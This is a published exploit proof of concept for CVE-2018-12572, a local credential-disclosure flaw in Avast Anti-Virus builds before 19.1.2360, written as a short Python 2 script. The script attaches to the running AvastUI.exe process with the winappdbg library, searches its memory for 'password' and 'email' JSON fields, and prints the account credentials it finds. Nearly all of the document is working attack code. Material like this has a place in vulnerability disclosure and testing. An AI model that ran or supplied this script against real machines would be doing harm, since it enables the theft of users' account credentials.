# Exploit Title: Avast Anti-Virus Local Credentials Disclosure < 19.1.2360
# Date: 01/18/2019
# Exploit Author: Nathu Nandwani
# Website: http://nandtech.co/
# Version: before 19.1.2360 (build 19.1.4142.0)
# Tested on: Windows 10 x64
# CVE: CVE-2018-12572
# Based on LiquidWorm's and Yakir Wizman's proof of concepts

from winappdbg import Debug, Process

debug = Debug()
processname = "AvastUI.exe"
pid = 0
mem_contents = []

email = ""
password = ""

try:
    debug.system.scan_processes()
    for (process, process_name) in debug.system.find_processes_by_filename(processname):
        pid = process.get_pid()
    if pid is not 0:
        print ("AvastUI PID: " + str(pid))
        process = Process(pid)
        for i in process.search_regexp('"password":"'):
            mem_contents.append(process.read(i[0], 200))
            print "Dump: "
            print process.read(i[0], 200)
        for i in mem_contents:
            password = i.split(",")[0]
        for i in process.search_regexp('"email":"'):
            mem_contents.append(process.read(i[0], 200))
            print "Dump: "
            print process.read(i[0], 200)
        for i in mem_contents:
            email = i.split(",")[0]
        if email != "" and password != "":
            print ""
            print "Found Credentials from Memory!"
            print email
            print password
        else:
            print "No credentials found!"
    else:
        print "Avast not running!"
finally:
    debug.stop()